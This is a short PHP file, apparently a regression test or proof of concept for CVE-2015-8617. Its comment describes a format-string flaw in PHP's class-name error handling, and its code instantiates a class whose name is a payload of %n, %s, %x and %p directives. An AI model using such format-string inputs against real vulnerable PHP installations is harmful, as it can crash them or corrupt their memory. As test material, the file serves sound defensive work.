<?php
// CVE: CVE-2015-8617
// zend_throw_or_error passed the class name to a printf-style formatter, so
// format directives in a dynamic class name were interpreted.
$name = '%n%n%n%n%s%s%s%x%p';
new $name;
